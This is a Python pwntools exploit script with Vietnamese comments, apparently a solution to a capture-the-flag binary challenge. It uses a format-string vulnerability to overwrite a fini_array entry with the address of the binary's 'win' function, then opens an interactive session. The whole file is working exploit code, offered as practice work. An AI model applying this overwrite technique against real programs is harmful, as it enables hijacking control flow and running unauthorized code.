from pwn import *

exe = './challenge'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# Địa chỉ mục tiêu: Entry của fini_array (Lấy từ R14 trong GDB của bạn)
FINI_ARRAY_ENTRY = 0x403e18

# Địa chỉ hàm Win (0x40121b để safe stack, hoặc bạn có thể thử 0x401216)
WIN_ADDR = elf.sym['win']

def start():
    if args.GDB:
        return gdb.debug(exe, '''
            b *vuln+63
            continue
        ''')
    else:
        return process(exe)

p = start()

# --- TÍNH TOÁN PAYLOAD ---
# Mục tiêu: Ghi 2 byte cuối của WIN_ADDR (0x121b = 4635) vào FINI_ARRAY_ENTRY
# Payload structure: [Format String] + [Padding] + [Address]

# 1. Phần Format String: In 4635 ký tự để đạt giá trị cần ghi
# %4635c : In 4635 char
# %8$hn  : Ghi 2 byte (short) vào tham số thứ 8
# Tại sao là tham số 8?
# - Payload bắt đầu ở tham số 6.
# - Format string + Padding chiếm 16 bytes (2 block 8-byte).
# - Block 1 là tham số 6, Block 2 là tham số 7.
# - Address nằm ngay sau đó -> Tham số 8.
writes = {FINI_ARRAY_ENTRY: WIN_ADDR}

# Pwnlib có hàm fmtstr_payload tự tính toán offset cho mình cực xịn
# offset = 6 (Vị trí bắt đầu buffer)
payload = fmtstr_payload(6, writes, write_size='short')

log.info(f"Target: {hex(FINI_ARRAY_ENTRY)}")
log.info(f"Win Addr: {hex(WIN_ADDR)}")
log.info(f"Payload len: {len(payload)}")

p.sendline(payload)

p.interactive()